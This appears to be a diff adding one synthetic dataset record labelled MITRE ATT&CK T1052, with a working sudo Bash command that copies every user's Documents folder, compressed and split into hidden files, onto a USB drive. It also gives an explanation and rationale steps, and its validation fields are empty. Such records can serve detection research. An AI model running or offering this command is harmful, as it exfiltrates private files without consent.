@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(ls -1 /dev/disk/by-id/usb-*-part1 2>/dev/null | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && tar -cf - /home/*/Documents | gzip -9 | split -b 100M - /mnt/usb/.docs.gz.part- && sync && umount /mnt/usb'",
+  "explanation": "Compresses users' Documents with gzip and splits the archive into 100MB chunks on the mounted USB to fit various media sizes and avoid large single files.",
+  "rationale_steps": [
+    "Mount the USB partition from a by-id device path.",
+    "Create a tar of local document files and compress with gzip.",
+    "Split the stream into smaller parts directly on the USB.",
+    "Flush writes and unmount to complete local-only transfer."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-6726821e",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
